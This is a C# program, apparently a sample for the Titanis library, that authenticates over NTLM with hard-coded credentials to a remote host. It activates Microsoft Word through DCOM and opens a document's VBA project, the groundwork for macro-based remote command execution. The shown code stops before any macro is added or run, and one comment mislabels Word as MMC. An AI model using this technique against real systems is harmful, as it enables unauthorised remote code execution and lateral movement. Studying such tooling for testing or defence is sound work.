using System.Threading;
using Titanis.Cli;
using Titanis.DceRpc;
using Titanis.DceRpc.Client;
using Titanis.Msrpc.Msdcom;
using Titanis.Net;
using Titanis.Security;
using Titanis.Security.Ntlm;

namespace WordMacroExec
{
	[Command(HelpText = "Executes a remote command via Microsoft Word")]
	internal class Program : Command
	{
		static async Task Main(string[] args)
			=> RunProgramAsync<Program>(args);
		protected sealed override async Task<int> RunAsync(CancellationToken cancellationToken)
		{
			Guid clsidWord = new Guid("{000209FF-0000-0000-C000-000000000046}");

			// Set parameters
			string target = "10.66.0.13";
			string myWorkstationName = "TEST-WKS";

			// Create credentials
			var creds = new ClientCredentialDictionary();
			creds.DefaultCredentialFactory = (spn, caps) =>
			{
				var ntlmContext = new NtlmClientContext(new NtlmPasswordCredential("milchick", "LUMON", "Br3@kr00m!"), true);
				ntlmContext.RequiredCapabilities |= SecurityCapabilities.Integrity | SecurityCapabilities.Confidentiality;
				ntlmContext.Workstation = myWorkstationName;
				ntlmContext.ClientChannelBindingsUnhashed = new byte[16];
				ntlmContext.TargetSpn = spn;
				return ntlmContext;
			};
			this.Services.AddService(typeof(IClientCredentialService), creds);

			// Create RPC client
			RpcClient rpcClient = this.CreateRpcClient();
			rpcClient.DefaultAuthLevel = RpcAuthLevel.PacketIntegrity;
			rpcClient.PreferAuth3 = false;

			// Connect to DCOM service
			DcomClient dcom = await DcomClient.ConnectTo(
				target,
				rpcClient,
				cancellationToken);

			// Start MMC
			dynamic wordApp = await dcom.Activate(clsidWord, cancellationToken);
			var doc = wordApp.Documents.Add();
			var vbproj = doc.VBProject;

			return 0;
		}
	}
}
